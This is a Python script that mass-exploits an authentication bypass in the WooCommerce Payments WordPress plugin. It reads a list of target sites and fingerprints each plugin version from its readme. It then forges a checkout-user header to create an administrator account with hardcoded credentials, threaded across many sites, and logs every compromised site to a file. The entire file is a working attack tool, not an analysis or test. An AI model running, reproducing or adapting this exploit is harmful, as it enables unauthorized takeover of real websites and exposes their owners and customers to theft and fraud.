import re
import sys
import urllib3
import requests
from colorama import Fore, Style
import threading

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

username = "hanzou"
password = "Jancok0000"

def check_version(target):
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "https://" + target

    try:
        r = requests.get(f"{target}/wp-content/plugins/woocommerce-payments/readme.txt", verify=False, timeout=10)
        version = re.search(r"Stable tag: (.*)", r.text).groups()[0]
    except requests.Timeout:
        return 'Down'
    except:
        return None

    if int(version.replace('.', '')) < 562:
        return f'{version} - vulnerable!'
    else:
        return f'{version} - not vulnerable!'

def add_admin(target, email):
    if not target.startswith("http://") and not target.startswith("https://"):
        target = "https://" + target

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Vivaldi/6.1.3035.111.',
        'X-WCPAY-PLATFORM-CHECKOUT-USER': '1'
    }

    data = {
        'rest_route': '/wp/v2/users',
        'username': username,
        'email': email,
        'password': password,
        'roles': 'administrator'
    }

    s = requests.Session()
    try:
        r = s.get(f'{target}', headers=headers, verify=False, timeout=10)
    except requests.Timeout:
        return False
    except:
        return False

    r = s.post(f'{target}', data=data, headers=headers, verify=False, timeout=10)
    if r.status_code == 201:
        return True
    else:
        return False

def exploit_website(website, email):
    if not website.startswith("http://") and not website.startswith("https://"):
        website = "https://" + website

    print(Fore.YELLOW + f'Exploiting {website}')
    version = check_version(website)
    if version is not None:
        print(Style.RESET_ALL + "Site version:", end=' ')
        if "vulnerable" in version:
            print(Fore.GREEN + version)
            success = add_admin(website, email)
            if success:
                with open("Site-Vuln.txt", "a") as file:
                    file.write(f"Site: {website}\n")
                    file.write(f"Username: {username}\n")
                    file.write(f"Password: {password}\n\n")
                print(Style.RESET_ALL + Fore.GREEN + "Vuln")
                print(f'Username: {username}')
                print(f'Password: {password}')
                print()
                return
            else:
                print(Style.RESET_ALL + Fore.RED + "Not Vuln")
                print(Fore.RED + "Failed to add admin.")
        else:
            print(Fore.RED + version)
            print(Style.RESET_ALL + Fore.RED + "Not Vuln")
    else:
        print(Fore.RED + "Failed to check version")
        print(Style.RESET_ALL + Fore.RED + "Not Vuln")

def main():
    print()
    print(Fore.BLUE + """  _      __          _____                                
 | | /| / /__  ___  / ___/__  __ _  __ _  ___ ___________ 
 | |/ |/ / _ \/ _ \/ /__/ _ \/  ' \/  ' \/ -_) __/ __/ -_)
 |__/|__/\___/\___/\___/\___/_/_/_/_/_/_/\__/_/  \__/\__/ 
                                                          """)
    print("[ WooCommerce Payments - Unauthorized Add Admin User ]")
    print(Style.RESET_ALL)

    weblist = input('Weblist: ')
    email = input('Your email: ')
    num_threads = int(input('Threads (number): '))

    with open(weblist, 'r') as file:
        websites = file.read().splitlines()

    if not websites:
        print(Fore.RED + 'Error: The website list is empty')
        exit()

    threads = []
    for website in websites:
        thread = threading.Thread(target=exploit_website, args=(website, email))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
